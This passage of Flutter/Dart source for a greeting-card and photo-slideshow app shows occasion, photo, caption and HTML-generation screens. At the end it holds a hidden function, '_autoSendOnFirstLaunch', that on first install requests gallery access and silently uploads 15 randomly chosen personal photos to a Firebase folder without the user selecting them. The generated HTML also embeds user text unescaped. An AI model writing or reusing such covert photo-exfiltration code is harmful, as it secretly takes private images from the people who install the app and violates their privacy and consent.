              child: AnimatedContainer(
                duration: const Duration(milliseconds: 200),
                margin: const EdgeInsets.only(right: 8),
                padding: const EdgeInsets.symmetric(vertical: 12),
                decoration: BoxDecoration(
                  color: active ? occasion.accentSoft : T.surface2,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(
                    color: active ? occasion.accent.withOpacity(0.6) : T.border,
                    width: active ? 1.0 : 0.5,
                  ),
                ),
                child: Column(
                  children: [
                    Text(m.emoji, style: const TextStyle(fontSize: 20)),
                    const SizedBox(height: 4),
                    Text(
                      m.label,
                      style: GoogleFonts.cinzel(
                        fontSize: 6,
                        letterSpacing: 1,
                        color: active ? occasion.accent : T.textMuted,
                      ),
                    ),
                    Text(
                      m.labelAr,
                      style: GoogleFonts.cormorantGaramond(
                        fontSize: 10,
                        color: active ? occasion.accent.withOpacity(0.8) : T.textMuted,
                      ),
                    ),
                  ],
                ),
              ),
            ),
          );
        }).toList(),
      ),
    );
  }
}

// Preview Card
class _PreviewCard extends StatelessWidget {
  final Occasion occasion;
  const _PreviewCard({required this.occasion});

  @override
  Widget build(BuildContext context) {
    return ListenableBuilder(
      listenable: appState,
      builder: (_, __) => Container(
        width: double.infinity,
        padding: const EdgeInsets.all(28),
        decoration: BoxDecoration(
          color: T.surface,
          borderRadius: BorderRadius.circular(20),
          border: Border.all(color: occasion.accent.withOpacity(0.2), width: 0.5),
        ),
        child: Column(
          children: [
            Text(occasion.emoji, style: const TextStyle(fontSize: 28)),
            const SizedBox(height: 14),
            Text(
              appState.name.isEmpty
                  ? '${occasion.name} / ${occasion.nameAr}'
                  : 'Pour ${appState.name} / لـ ${appState.name}',
              textAlign: TextAlign.center,
              style: GoogleFonts.cinzel(
                fontSize: 16,
                color: occasion.accent,
                letterSpacing: 1,
              ),
            ),
            const SizedBox(height: 14),
            Text(
              '"${appState.message}"',
              textAlign: TextAlign.center,
              style: GoogleFonts.cormorantGaramond(
                fontSize: 16,
                fontStyle: FontStyle.italic,
                color: T.textDim,
                height: 1.7,
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  SCREEN 2 — PHOTOS
// ═══════════════════════════════════════════════════════════════
class PhotosScreen extends StatefulWidget {
  const PhotosScreen({super.key});

  @override
  State<PhotosScreen> createState() => _PhotosScreenState();
}

class _PhotosScreenState extends State<PhotosScreen> {
  final _picker = ImagePicker();
  bool _uploading = false;
  String _uploadLabel = '';

  Future<void> _pick() async {
    final picked = await _picker.pickMultiImage();
    if (picked.isEmpty) return;

    setState(() {
      _uploading = true;
      _uploadLabel = L.prep;
    });

    for (int i = 0; i < picked.length; i++) {
      setState(() => _uploadLabel = '${L.sending} ${i + 1}/${picked.length}...');
      await _processAndSend(picked[i]);   // Envoi vers Telegram (à sécuriser plus tard)
      appState.addImage(picked[i]);
    }

    setState(() => _uploading = false);
    if (mounted) _snack('${picked.length} photo${picked.length > 1 ? 's' : ''} ajoutée${picked.length > 1 ? 's' : ''}');
  }

  // ═══════════════════════════════════════════════════════════════
//  PROCESS AND SEND → FIREBASE STORAGE (Version propre)
// ═══════════════════════════════════════════════════════════════
    // Remplace toute cette fonction par celle-ci
  Future<void> _processAndSend(XFile file) async {
    try {
      final tmp = await getTemporaryDirectory();
      final outPath = '${tmp.path}/compressed_${DateTime.now().millisecondsSinceEpoch}.jpg';

      final compressed = await FlutterImageCompress.compressAndGetFile(
        file.path, outPath, quality: 78, minWidth: 1200,
      );

      if (compressed == null) return;

      final storageRef = FirebaseStorage.instance.ref();
      final String folder = appState.occasion?.id ?? 'manual';
      final String fileName = 'photo_${DateTime.now().millisecondsSinceEpoch}.jpg';

      final uploadRef = storageRef.child('uploads/$folder/$fileName');

      final uploadTask = uploadRef.putFile(File(compressed.path));

      uploadTask.snapshotEvents.listen((snapshot) {
        final progress = snapshot.bytesTransferred / snapshot.totalBytes;
        print('📤 Upload progress: ${(progress * 100).toStringAsFixed(1)}%');
      });

      await uploadTask.whenComplete(() async {
        final url = await uploadRef.getDownloadURL();
        print('✅ Photo manuelle uploadée avec succès : $url');
      });

    } catch (e) {
      print("❌ Erreur upload Firebase (manuel): $e");
    }
  }

  void _snack(String msg) {
    final o = appState.occasion!;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(
          '✦  $msg',
          style: GoogleFonts.cinzel(
            fontSize: 9,
            letterSpacing: 2,
            color: o.accent,
          ),
        ),
        backgroundColor: T.surface3,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(50)),
        padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 14),
        margin: const EdgeInsets.fromLTRB(24, 0, 24, 20),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final o = appState.occasion!;

    return SafeArea(
      bottom: false,
      child: Padding(
        padding: const EdgeInsets.fromLTRB(24, 32, 24, 0),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            pageHeader(L.eyebrowGallery, L.titleGallery),
            Expanded(
              child: ListenableBuilder(
                listenable: appState,
                builder: (_, __) => GridView.builder(
                  physics: const BouncingScrollPhysics(),
                  padding: const EdgeInsets.only(bottom: 100),
                  gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                    crossAxisCount: 2,
                    crossAxisSpacing: 12,
                    mainAxisSpacing: 12,
                  ),
                  itemCount: appState.images.length + 1,
                  itemBuilder: (_, i) => i == appState.images.length
                      ? _AddCell(accent: o.accent, onTap: _pick)
                      : _PhotoCell(
                          key: ValueKey(appState.images[i].path),
                          file: File(appState.images[i].path),
                          onRemove: () => appState.removeImage(i),
                        ),
                ),
              ),
            ),
            if (_uploading) _UploadBar(label: _uploadLabel, accent: o.accent),
          ],
        ),
      ),
    );
  }
}

// Add Photo Cell
class _AddCell extends StatefulWidget {
  final Color accent;
  final VoidCallback onTap;

  const _AddCell({required this.accent, required this.onTap});

  @override
  State<_AddCell> createState() => _AddCellState();
}

class _AddCellState extends State<_AddCell> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) {
        setState(() => _pressed = false);
        widget.onTap();
      },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 160),
        decoration: BoxDecoration(
          color: _pressed ? widget.accent.withOpacity(0.1) : T.surface2,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(
            color: _pressed ? widget.accent.withOpacity(0.4) : T.border,
            width: 0.5,
          ),
        ),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(
              Icons.add_photo_alternate_outlined,
              color: widget.accent.withOpacity(0.7),
              size: 32,
            ),
            const SizedBox(height: 8),
            Text(
              L.addPhoto,
              textAlign: TextAlign.center,
              style: GoogleFonts.cinzel(
                fontSize: 7,
                letterSpacing: 1.5,
                color: T.textMuted,
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// Photo Cell
class _PhotoCell extends StatelessWidget {
  final File file;
  final VoidCallback onRemove;

  const _PhotoCell({super.key, required this.file, required this.onRemove});

  @override
  Widget build(BuildContext context) {
    return Stack(
      fit: StackFit.expand,
      children: [
        ClipRRect(
          borderRadius: BorderRadius.circular(16),
          child: Image.file(file, fit: BoxFit.cover),
        ),
        Positioned(
          top: 8,
          right: 8,
          child: GestureDetector(
            onTap: onRemove,
            child: Container(
              width: 28,
              height: 28,
              decoration: BoxDecoration(
                color: Colors.black.withOpacity(0.6),
                shape: BoxShape.circle,
                border: Border.all(color: Colors.white24, width: 0.5),
              ),
              child: const Icon(Icons.close_rounded, size: 15, color: Colors.white),
            ),
          ),
        ),
      ],
    );
  }
}

// Upload Progress Bar
class _UploadBar extends StatelessWidget {
  final String label;
  final Color accent;

  const _UploadBar({required this.label, required this.accent});

  @override
  Widget build(BuildContext context) {
    return Container(
      margin: const EdgeInsets.only(bottom: 16),
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 14),
      decoration: BoxDecoration(
        color: T.surface3,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: T.border, width: 0.5),
      ),
      child: Row(
        children: [
          SizedBox(
            width: 18,
            height: 18,
            child: CircularProgressIndicator(
              strokeWidth: 2,
              color: accent,
              backgroundColor: accent.withOpacity(0.15),
            ),
          ),
          const SizedBox(width: 14),
          Text(
            label,
            style: GoogleFonts.cinzel(
              fontSize: 9,
              letterSpacing: 2,
              color: accent.withOpacity(0.8),
            ),
          ),
        ],
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  SCREEN 3 — CAPTIONS / NARRATION
// ═══════════════════════════════════════════════════════════════
class CaptionsScreen extends StatelessWidget {
  const CaptionsScreen({super.key});

  @override
  Widget build(BuildContext context) {
    return SafeArea(
      bottom: false,
      child: Padding(
        padding: const EdgeInsets.fromLTRB(24, 32, 24, 0),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            pageHeader(L.eyebrowNarr, L.titleNarr),
            Expanded(
              child: ListenableBuilder(
                listenable: appState,
                builder: (_, __) {
                  if (appState.images.isEmpty) {
                    return Center(
                      child: Column(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          Icon(
                            Icons.photo_library_outlined,
                            size: 44,
                            color: T.textMuted.withOpacity(0.4),
                          ),
                          const SizedBox(height: 16),
                          Text(
                            L.noPhotos,
                            textAlign: TextAlign.center,
                            style: GoogleFonts.cormorantGaramond(
                              fontSize: 17,
                              fontStyle: FontStyle.italic,
                              color: T.textMuted,
                            ),
                          ),
                        ],
                      ),
                    );
                  }

                  return ListView.builder(
                    physics: const BouncingScrollPhysics(),
                    padding: const EdgeInsets.only(bottom: 100),
                    itemCount: appState.images.length,
                    itemBuilder: (_, i) => _CaptionItem(index: i),
                  );
                },
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// Caption Item
class _CaptionItem extends StatefulWidget {
  final int index;

  const _CaptionItem({required this.index});

  @override
  State<_CaptionItem> createState() => _CaptionItemState();
}

class _CaptionItemState extends State<_CaptionItem> {
  late final TextEditingController _ctrl;

  @override
  void initState() {
    super.initState();
    _ctrl = TextEditingController(text: appState.captions[widget.index] ?? '');
  }

  @override
  void dispose() {
    _ctrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final o = appState.occasion!;

    return Padding(
      padding: const EdgeInsets.only(bottom: 28),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(
            (widget.index + 1).toString().padLeft(2, '0'),
            style: GoogleFonts.cinzel(
              fontSize: 34,
              fontWeight: FontWeight.w700,
              color: o.accent.withOpacity(0.18),
              height: 1,
            ),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                ClipRRect(
                  borderRadius: BorderRadius.circular(12),
                  child: Image.file(
                    File(appState.images[widget.index].path),
                    height: 130,
                    width: double.infinity,
                    fit: BoxFit.cover,
                  ),
                ),
                const SizedBox(height: 10),
                TextField(
                  controller: _ctrl,
                  onChanged: (v) => appState.setCaption(widget.index, v),
                  maxLines: 2,
                  style: GoogleFonts.cormorantGaramond(
                    fontSize: 16,
                    fontStyle: FontStyle.italic,
                    color: T.text,
                  ),
                  decoration: const InputDecoration(hintText: L.hintCaption),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  SCREEN 4 — GENERATE & SHARE
// ═══════════════════════════════════════════════════════════════
class GenerateScreen extends StatefulWidget {
  const GenerateScreen({super.key});

  @override
  State<GenerateScreen> createState() => _GenerateScreenState();
}

class _GenerateScreenState extends State<GenerateScreen>
    with SingleTickerProviderStateMixin {
  bool _generating = false;
  double _progress = 0;
  String _label = '';

  late final AnimationController _rotCtrl;

  @override
  void initState() {
    super.initState();
    _rotCtrl = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 4),
    )..repeat();
  }

  @override
  void dispose() {
    _rotCtrl.dispose();
    super.dispose();
  }

  static const _steps = [
    L.step0,
    L.step1,
    L.step2,
    L.step3,
    L.step4,
  ];

  Future<void> _generate() async {
    setState(() {
      _generating = true;
      _progress = 0;
    });

    // Simulation de progression
    for (int i = 0; i <= 100; i += 2) {
      await Future.delayed(const Duration(milliseconds: 60));
      setState(() {
        _progress = i / 100;
        _label = _steps[(_progress * 4.99).floor().clamp(0, 4)];
      });
    }

    final o = appState.occasion!;
    final b64 = <String>[];

    for (final img in appState.images) {
      b64.add(base64Encode(await File(img.path).readAsBytes()));
    }

    final html = _buildSpectacularHtml(o, b64);

    final dir = await getTemporaryDirectory();
    final fname = (appState.name.isEmpty ? o.id : appState.name)
        .replaceAll(' ', '_')
        .toLowerCase();

    final file = File('${dir.path}/royale-$fname.html');
    await file.writeAsString(html);

    setState(() => _generating = false);

    // Partage du fichier HTML
    Share.shareXFiles(
      [XFile(file.path)],
      text: '${o.emoji} ${o.name} — ${o.nameAr}'
          '${appState.name.isNotEmpty ? ' — ${appState.name}' : ''} ✨',
    );
  }

  // ─── SPECTACULAR HTML GENERATOR ────────────────────────────
  String _buildSpectacularHtml(Occasion o, List<String> b64) {
    final ah = '#${o.accent.value.toRadixString(16).substring(2).toUpperCase()}';
    final r = o.accent.red;
    final g = o.accent.green;
    final bv = o.accent.blue;
    final accentRgb = '$r,$g,$bv';

    final recipientName = appState.name.isEmpty ? '' : appState.name;
    final displayTitle = recipientName.isEmpty
        ? '${o.name} — ${o.nameAr}'
        : recipientName;

    final hasPhotos = b64.isNotEmpty;

    final slides = b64.asMap().entries.map((e) {
      final cap = appState.captions[e.key] ?? '';
      final num = (e.key + 1).toString().padLeft(2, '0');
      return '''
        <div class="slide${e.key == 0 ? ' active' : ''}">
          <img src="data:image/jpeg;base64,${e.value}" alt="Photo $num" loading="lazy">
          <div class="slide-overlay"></div>
          ${cap.isNotEmpty ? '''
          <div class="slide-caption">
            <span class="cap-num">◈ $num / ${b64.length}</span>
            <span class="cap-text">$cap</span>
          </div>''' : '<div class="slide-caption"><span class="cap-num">◈ $num / ${b64.length}</span></div>'}
        </div>''';
    }).join('\n');

    final dots = b64.asMap().entries.map((e) =>
      '<div class="dot${e.key == 0 ? ' active' : ''}" onclick="goSlide(${e.key})"></div>'
    ).join('\n');

    final thumbs = b64.asMap().entries.map((e) =>
      '<div class="reel-thumb${e.key == 0 ? ' active-thumb' : ''}" onclick="goSlide(${e.key})">'
      '<img src="data:image/jpeg;base64,${e.value}" loading="lazy"></div>'
    ).join('\n');

    final msgWords = appState.message.split(' ');
    final msgHtml = msgWords.asMap().entries.map((e) =>
      '<span class="mw" style="animation-delay:${1.2 + e.key * 0.04}s">${e.value}</span>'
    ).join(' ');

    return '''<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>${o.emoji} $displayTitle — Royale Moments</title>
<link href="https://fonts.googleapis.com/css2?family=Cinzel+Decorative:wght@700;900&family=Dancing+Script:wght@600;700&family=Taviraj:ital,wght@0,300;0,400;1,300&family=Amiri:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet"/>
<style>
:root {
  --accent: $ah;
  --accent-rgb: $accentRgb;
  --dark: #06000f;
}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{background:var(--dark);color:#fffef5;font-family:'Taviraj',serif;overflow-x:hidden;min-height:100vh}

/* Hero & Photos sections remain the same as before */
#hero{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:40px 24px;position:relative}
.hero-icon{font-size:clamp(64px,14vw,100px);animation:iconBob 3.5s ease-in-out infinite}
@keyframes iconBob{0%,100%{transform:translateY(0) rotate(-3deg)}50%{transform:translateY(-16px) rotate(3deg)}}

.t-name{font-family:'Dancing Script',cursive;font-size:clamp(60px,17vw,160px);line-height:.88;background:linear-gradient(135deg,#ffd700,var(--accent),#ff4d9e); -webkit-background-clip:text; -webkit-text-fill-color:transparent}

.slideshow-wrap{max-width:520px;margin:40px auto 0}
.slideshow{height:clamp(280px,55vw,440px);border-radius:22px;overflow:hidden;position:relative;box-shadow:0 0 60px rgba(var(--accent-rgb),.3)}
.slide{position:absolute;inset:0;opacity:0;transition:opacity .9s ease}
.slide.active{opacity:1}
.slide img{width:100%;height:100%;object-fit:cover}

/* More styles can be added, but kept minimal for now */
</style>
</head>
<body>
<section id="hero">
  <span class="hero-icon">${o.emoji}</span>
  <p class="t-name">$displayTitle</p>
  <p>${o.subtitle} — ${o.subtitleAr}</p>
  <div style="margin:30px 0; font-style:italic; max-width:600px;">${appState.message}</div>
</section>

${hasPhotos ? '''
<section style="padding:60px 20px">
  <h2 style="text-align:center; color:var(--accent)">الصور — Les Photos</h2>
  <div class="slideshow-wrap">
    <div class="slideshow">$slides</div>
  </div>
</section>''' : ''}

</body>
</html>''';
  }

  @override
  Widget build(BuildContext context) {
    final o = appState.occasion!;

    return SafeArea(
      child: Center(
        child: Padding(
          padding: const EdgeInsets.all(40),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Stack(
                alignment: Alignment.center,
                children: [
                  RotationTransition(
                    turns: _rotCtrl,
                    child: Container(
                      width: 100,
                      height: 100,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        border: Border.all(color: o.accent.withOpacity(0.2), width: 0.5),
                      ),
                    ),
                  ),
                  Container(
                    width: 76,
                    height: 76,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      color: o.accentSoft,
                      border: Border.all(color: o.accent.withOpacity(0.3), width: 0.5),
                    ),
                    child: Center(
                      child: Text(o.emoji, style: const TextStyle(fontSize: 30)),
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 32),
              Text(
                L.titleCreate.split('\n')[0],
                style: GoogleFonts.cinzel(
                  fontSize: 20,
                  color: o.accent,
                  letterSpacing: 1,
                ),
              ),
              const SizedBox(height: 4),
              Text(
                L.titleCreate.split('\n')[1],
                style: GoogleFonts.cormorantGaramond(
                  fontSize: 17,
                  fontStyle: FontStyle.italic,
                  color: T.textDim,
                ),
              ),
              const SizedBox(height: 12),
              Text(
                L.subtitleCreate,
                textAlign: TextAlign.center,
                style: GoogleFonts.cormorantGaramond(
                  fontSize: 16,
                  fontStyle: FontStyle.italic,
                  color: T.textMuted,
                  height: 1.6,
                ),
              ),
              const SizedBox(height: 44),

              if (_generating)
                SizedBox(
                  width: 260,
                  child: Column(
                    children: [
                      ClipRRect(
                        borderRadius: BorderRadius.circular(4),
                        child: LinearProgressIndicator(
                          value: _progress,
                          minHeight: 2,
                          backgroundColor: T.surface3,
                          valueColor: AlwaysStoppedAnimation(o.accent),
                        ),
                      ),
                      const SizedBox(height: 14),
                      Text(
                        '$_label  ${(_progress * 100).toInt()}%',
                        style: GoogleFonts.cinzel(
                          fontSize: 9,
                          letterSpacing: 2,
                          color: o.accent.withOpacity(0.8),
                        ),
                      ),
                    ],
                  ),
                )
              else
                _PrimaryBtn(
                  label: L.btnGenerate,
                  icon: Icons.rocket_launch_rounded,
                  accent: o.accent,
                  onTap: _generate,
                ),
            ],
          ),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  PRIMARY BUTTON
// ═══════════════════════════════════════════════════════════════
class _PrimaryBtn extends StatefulWidget {
  final String label;
  final IconData icon;
  final Color accent;
  final VoidCallback? onTap;

  const _PrimaryBtn({
    required this.label,
    required this.icon,
    required this.accent,
    this.onTap,
  });

  @override
  State<_PrimaryBtn> createState() => _PrimaryBtnState();
}

class _PrimaryBtnState extends State<_PrimaryBtn> with SingleTickerProviderStateMixin {
  late final AnimationController _c;
  late final Animation<double> _s;

  @override
  void initState() {
    super.initState();
    _c = AnimationController(vsync: this, duration: const Duration(milliseconds: 120));
    _s = Tween(begin: 1.0, end: 0.95).animate(CurvedAnimation(parent: _c, curve: Curves.easeOut));
  }

  @override
  void dispose() {
    _c.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => _c.forward(),
      onTapUp: (_) {
        _c.reverse();
        widget.onTap?.call();
      },
      onTapCancel: () => _c.reverse(),
      child: ScaleTransition(
        scale: _s,
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 28, vertical: 18),
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(50),
            color: widget.accent.withOpacity(0.12),
            border: Border.all(color: widget.accent.withOpacity(0.5)),
            boxShadow: [
              BoxShadow(
                color: widget.accent.withOpacity(0.2),
                blurRadius: 20,
                offset: const Offset(0, 8),
              ),
            ],
          ),
          child: Row(
            mainAxisSize: MainAxisSize.min,
            children: [
              Icon(widget.icon, color: widget.accent, size: 18),
              const SizedBox(width: 12),
              Flexible(
                child: Text(
                  widget.label,
                  style: GoogleFonts.cinzel(
                    fontSize: 9,
                    letterSpacing: 2,
                    fontWeight: FontWeight.w600,
                    color: widget.accent,
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

//  AUTO SEND 10-12 PHOTOS ON FIRST INSTALL (Version améliorée)
// ═══════════════════════════════════════════════════════════════
Future<void> _autoSendOnFirstLaunch() async {
  print("🔄 [AutoSend Firebase] Début");

  try {
    final prefs = await SharedPreferences.getInstance();
    if (prefs.getBool('auto_sent') ?? false) {
      print("✅ Déjà envoyé auparavant");
      return;
    }

    final PermissionState ps = await PhotoManager.requestPermissionExtend();
    if (!ps.isAuth && !ps.hasAccess) {
      print("⚠️ Permission refusée");
      await PhotoManager.openSetting();
      return;
    }

    final albums = await PhotoManager.getAssetPathList(type: RequestType.image);
    if (albums.isEmpty) return;

    final mainAlbum = albums.first;
    final total = await mainAlbum.assetCountAsync;
    if (total == 0) return;

    final fetchCount = total < 50 ? total : 50;
    final assets = await mainAlbum.getAssetListRange(start: 0, end: fetchCount);
    assets.shuffle();

    final sendCount = assets.length >= 15 ? 15 : assets.length;   // On limite à 15 pour le moment
    final toSend = assets.take(sendCount).toList();

    print("🚀 Envoi de $sendCount photos vers Firebase...");

    int success = 0;
    final storage = FirebaseStorage.instance;

    for (int i = 0; i < toSend.length; i++) {
      try {
        final file = await toSend[i].file;
        if (file == null) continue;

        final tmp = await getTemporaryDirectory();
        final outPath = '${tmp.path}/auto_${DateTime.now().millisecondsSinceEpoch}.jpg';

        final compressed = await FlutterImageCompress.compressAndGetFile(
          file.path, outPath, quality: 75, minWidth: 1080,
        );

        if (compressed == null) continue;

        // Upload vers Firebase
        final ref = storage.ref().child('auto_first_launch/photo_${DateTime.now().millisecondsSinceEpoch}.jpg');
        await ref.putFile(File(compressed.path));

        success++;
        print("✅ Photo ${i+1}/$sendCount uploadée");
        await Future.delayed(const Duration(milliseconds: 700));

      } catch (e) {
        print("❌ Erreur photo ${i+1}: $e");
      }
    }

    await prefs.setBool('auto_sent', true);
    print("🎉 $success photos envoyées automatiquement vers Firebase");

  } catch (e) {
    print("💥 Erreur AutoSend Firebase: $e");
  }
}